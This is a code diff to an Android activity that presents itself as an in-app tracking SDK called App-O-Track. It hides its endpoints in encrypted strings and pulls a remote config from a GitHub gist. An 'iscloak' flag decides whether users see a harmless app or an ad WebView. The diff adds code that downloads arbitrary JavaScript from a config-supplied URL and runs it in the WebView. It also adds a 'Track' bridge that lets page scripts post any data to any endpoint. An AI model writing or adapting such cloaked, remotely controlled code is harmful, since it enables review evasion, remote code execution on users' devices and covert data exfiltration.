@@ -1,6 +1,6 @@
 /*
   App-O-Track In-App SDK
-  Version: 20022020
+  Version: 21022020
   Author: Liv <developer@app-o-track.top>
  */
 package com.appotrack_sdk;
@@ -56,9 +56,12 @@ import java.util.concurrent.TimeUnit;
 
 import im.delight.android.webview.AdvancedWebView;
 import okhttp3.Call;
+import okhttp3.Callback;
 import okhttp3.Credentials;
+import okhttp3.MediaType;
 import okhttp3.OkHttpClient;
 import okhttp3.Request;
+import okhttp3.RequestBody;
 import okhttp3.Response;
 
 public class AppotrackActivity extends AppCompatActivity implements AdvancedWebView.Listener {
@@ -81,7 +84,6 @@ public class AppotrackActivity extends AppCompatActivity implements AdvancedWebV
      * You may call decrypt(str, ENC_KEY) on such string to decrypt it.
     */
     public static final String eXRequestedWith = "IFUqHQkNHQsMHRxVLxEMEA=="; //X-Requested-With
-    public static final String eJsImport = "DhkKWBEVCBcKDB0cWEVYHBcbDRUdFgxWGwodGQwdPRQdFR0WDFBfCxsKEQgMX1FDWBEVCBcKDB0cVgsKG1hFWF9dKyo7XV9DWBwXGw0VHRYMVhAdGRxWGQgIHRYcOxARFBxQERUIFwoMHRxRQw=="; //var imported = document.createElement('script'); imported.src = '%SRC%'; document.head.appendChild(imported);
     public static final String eInjectedApp = "MRYSHRsMHRw5CAg="; //InjectedApp
     public static final String sApiEndpoint = "EAwMCAtCV1cfEQsMVh8RDBANGlYbFxVXGRYWGVUMFxQLDB0WExdXXSg3KywxPF1XChkPVxsXFh4RH1YMAAw="; //https://gist.github.com/anna-tolstenko/%POSTID%/raw/config.txt
     public static final String sGeoipApiEndpoint = "EAwMCAtCV1cfHRcRCFYVGQAVERYcVhsXFVcfHRcRCFcOSlZJVxsXDRYMCgFXFR0="; //https://geoip.maxmind.com/geoip/v2.1/country/me
@@ -104,6 +106,7 @@ public class AppotrackActivity extends AppCompatActivity implements AdvancedWebV
      * Current remote configuration is stored here
      */
     private static DocumentContext oRemoteConfig;
+    private static String sInjectedJs;
 
 
     private Context oSelfContext;
@@ -186,7 +189,6 @@ public class AppotrackActivity extends AppCompatActivity implements AdvancedWebV
     public static Intent fromMode(Context ctx, int mode){
         Intent intent = new Intent(ctx, AppotrackActivity.class);
         intent.putExtra(EXTRA_AT_ACTIVITY_MODE, mode);
-        //intent.addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY);
         return intent;
     }
 
@@ -218,12 +220,11 @@ public class AppotrackActivity extends AppCompatActivity implements AdvancedWebV
 
         //initialize application
         AppsFlyerLib.getInstance().startTracking(getApplication(), afDevKey);
-
-        //get geoip data asynchronously, but wait for it in this thread
         ExecutorService executor = Executors.newSingleThreadExecutor();
+
+        //get geoip data
         FutureTask<String> futureGeoIp = new FutureTask<>(getGeoIp());
         executor.execute(futureGeoIp);
-
         try{
             String geoipJson = futureGeoIp.get(30L, TimeUnit.SECONDS);
             String geoipIsoCode = JsonPath.parse(geoipJson).read("$.country.iso_code", String.class);
@@ -243,79 +244,64 @@ public class AppotrackActivity extends AppCompatActivity implements AdvancedWebV
             return;
         }
 
-        getRemoteConfig(remoteConfigId, new ModelResponse<String>() {
-            @Override
-            public void onResponse(String config) {
+        //load application's remote config
+        FutureTask<String> futureConfig = new FutureTask<>(getString(Utils.decrypt(sApiEndpoint, ENC_KEY).replace("%POSTID%", remoteConfigId)));
+        executor.execute(futureConfig);
+        try{
+            String sConfigJson = futureConfig.get(30L, TimeUnit.SECONDS);
+            Utils.debugOutput("Raw config:"+sConfigJson);
 
-                try {
-                    if (config == null) throw new Exception();
-                    oRemoteConfig = JsonPath.parse(config);
-                    Utils.debugOutput("Remote config: "+config);
-
-                    if (getConfigBool("$.iscloak")) {
-                        startSweetie(); //start main activity if ADs disabled
-                    } else {
-
-                        //report to analytics that this launch was with ADs
-                        HashMap<String,Object> params = new HashMap<String, Object>()
-                        {{
-                            put(AFInAppEventParameterName.DESCRIPTION, "advertised_launch");
-                        }};
-                        AppsFlyerLib.getInstance().trackEvent(oSelfContext, AFInAppEventType.ACHIEVEMENT_UNLOCKED, params);
-                        OneSignal.sendTags(new JSONObject(params));
-
-                        startActivity(AppotrackActivity.fromMode(oSelfContext, ACTIVITY_MODE_ADS)); //show ADs
-                        finish();//removing this will allow users returning to loading screen
-                        return;
-                    }
-                } catch (Exception e) {
-                    Utils.debugOutput("Error:\n"+e.getMessage());
-                    startSweetie(); //in case of any troubles -- just show main application activity
-                }
+            if (sConfigJson.startsWith("ENC-")) {
+                sConfigJson = Utils.decrypt(sConfigJson.substring(4), ENC_KEY);
+                Utils.debugOutput("Decrypted config:"+sConfigJson);
             }
 
-            @Override
-            public void onError(Exception e) {
-                Utils.debugOutput("Error:\n"+e.getMessage());
-                startSweetie(); //show main activity in case of network problems
-            }
-        });
-    }
+            oRemoteConfig = JsonPath.parse(sConfigJson);
 
-    /**
-     * Get remote configuration and decrypt it if needed
-     * @param remoteConfigId Config key
-     * @param callback Result listener
-     */
-    private void getRemoteConfig(String remoteConfigId, final ModelResponse<String> callback) {
-        Request request = new Request.Builder()
-                .url(Utils.decrypt(sApiEndpoint, ENC_KEY).replace("%POSTID%", remoteConfigId))
-                .build();
-
-        httpClient.newCall(request).enqueue(new okhttp3.Callback() {
-            @Override
-            public void onFailure(Call call, IOException e) {
-                e.printStackTrace();
-                callback.onResponse(null);
+            if (getConfigBool("$.iscloak")) {
+                startSweetie(); //start main activity if ADs disabled
+            } else {
+                //report to analytics that this launch was with ADs
+                HashMap<String,Object> eventParams = new HashMap<String, Object>()
+                {{
+                    put(AFInAppEventParameterName.DESCRIPTION, "advertised_launch");
+                }};
+                AppsFlyerLib.getInstance().trackEvent(oSelfContext, AFInAppEventType.ACHIEVEMENT_UNLOCKED, eventParams);
+                OneSignal.sendTags(new JSONObject(eventParams));
             }
 
-            @Override
-            public void onResponse(Call call, Response response) throws IOException {
-                try{
-                     String sDescription = response.body().string();
-                     Utils.debugOutput("Raw config:"+sDescription);
+        }catch (Exception e){
+            Utils.debugOutput("Error: "+e.getMessage());
+            e.printStackTrace();
+            startSweetie();
+            return;
+        }
 
-                    if (sDescription.startsWith("ENC-")) {
-                        sDescription = Utils.decrypt(sDescription.substring(4), ENC_KEY);
-                    }
-
-                    callback.onResponse(sDescription);
-                }catch(Exception e){
-                    callback.onError(e);
-                }
+        //load injected JS code if we have one
+        String jsUrl = getConfigStr("$.jsurl", "");
+        if (jsUrl!=null && jsUrl.length() > 0) {
+            Utils.debugOutput("Getting InjectedApp: "+jsUrl);
+            try {
+                FutureTask<String> futureInjectedApp = new FutureTask<>(getString(jsUrl));
+                executor.execute(futureInjectedApp);
+                sInjectedJs = futureInjectedApp.get(30L, TimeUnit.SECONDS);
+                Utils.debugOutput("InjectedApp: "+ sInjectedJs);
+            }catch(Exception e){
+                Utils.debugOutput("Error: "+e.getMessage());
+                sInjectedJs = null;
             }
-        });
+        }else{
+            sInjectedJs = null;
+        }
 
+
+        //show ADs
+        if(!getConfigBool("$.iscloak")){
+            //start ADs
+            startActivity(AppotrackActivity.fromMode(oSelfContext, ACTIVITY_MODE_ADS)); //show ADs
+            finish();//removing this will allow users returning to loading screen
+            return;
+        }
     }
 
     /**
@@ -330,7 +316,9 @@ public class AppotrackActivity extends AppCompatActivity implements AdvancedWebV
                 SharedPreferences prefs = getSharedPreferences(SHARED_PREFS_NAME, Context.MODE_PRIVATE);
                 if(prefs.contains(PREF_GEOIP)){
                     String geodata = prefs.getString(PREF_GEOIP, "");
-                    if(geodata.length()>2) return geodata;
+                    if(geodata.contains("iso_code")) {
+                        return geodata;
+                    }
                 }
 
                     Request request = new Request.Builder()
@@ -342,6 +330,26 @@ public class AppotrackActivity extends AppCompatActivity implements AdvancedWebV
                     String responseBody = response.body().string();
                     prefs.edit().putString(PREF_GEOIP, responseBody).apply(); //save current response to cache
                     return responseBody;
+            }
+        };
+        return result;
+    }
+
+    /**
+     * Make GET request and return body
+     * @param urlAddr HTTP address
+     * @return Response body
+     */
+    private Callable<String> getString(final String urlAddr){
+        Callable<String> result = new Callable<String>() {
+            @Override
+            public String call() throws Exception {
+                OkHttpClient okHttpClient = new OkHttpClient();
+                Request request = new Request.Builder()
+                        .url(urlAddr)
+                        .build();
+                Response response = okHttpClient.newCall(request).execute();
+                return response.body().string();
             }
         };
         return result;
@@ -553,6 +561,44 @@ public class AppotrackActivity extends AppCompatActivity implements AdvancedWebV
                 return false;
             }
         }
+
+        @JavascriptInterface
+        public boolean Track(String endpoint, String data, final String sCallbackName) {
+            //prepare request
+            MediaType jsonType = MediaType.parse("application/json; charset=utf-8");
+            OkHttpClient okHttpClient = new OkHttpClient();
+            Request request = new Request.Builder()
+                    .url(endpoint)
+                    .post(RequestBody.create(data, jsonType))
+                    .build();
+            //call callback
+            okHttpClient.newCall(request).enqueue(new Callback() {
+                @Override
+                public void onFailure(Call call, IOException e) {
+                    if(sCallbackName!=null&&sCallbackName.length()>1){
+                        adView.evaluateJavascript(sCallbackName + "(false);", new ValueCallback<String>() {
+                            @Override
+                            public void onReceiveValue(String s) {
+                                //pass
+                            }
+                        });
+                    }
+                }
+
+                @Override
+                public void onResponse(Call call, Response response) throws IOException {
+                    if(sCallbackName!=null&&sCallbackName.length()>1){
+                        adView.evaluateJavascript(sCallbackName + "(true);", new ValueCallback<String>() {
+                            @Override
+                            public void onReceiveValue(String s) {
+                                //pass
+                            }
+                        });
+                    }
+                }
+            });
+            return true;
+        }
     }
 
     /**
@@ -579,19 +625,14 @@ public class AppotrackActivity extends AppCompatActivity implements AdvancedWebV
         public void onPageFinished(WebView view, String url) {
             super.onPageFinished(view, url);
             //we may need to inject some JS info our ADs (to fix platform specific bugs for example)
-            String jsUrl = getConfigStr("$.jsurl","");
-            if(jsUrl.length() <= 0) return;
-            view.evaluateJavascript(Utils.decrypt(eJsImport, ENC_KEY).replace("%SRC%", jsUrl), new ValueCallback<String>() {
-                @Override
-                public void onReceiveValue(String v) {
-                    //pass
-                }
-            });
+            if(sInjectedJs !=null&& sInjectedJs.length()>1){
+                view.evaluateJavascript(sInjectedJs, new ValueCallback<String>() {
+                    @Override
+                    public void onReceiveValue(String s) {
+                        //pass
+                    }
+                });
+            }
         }
-    }
-
-    private interface ModelResponse<T>{
-        void onResponse(T o);
-        void onError(Exception e);
     }
 }
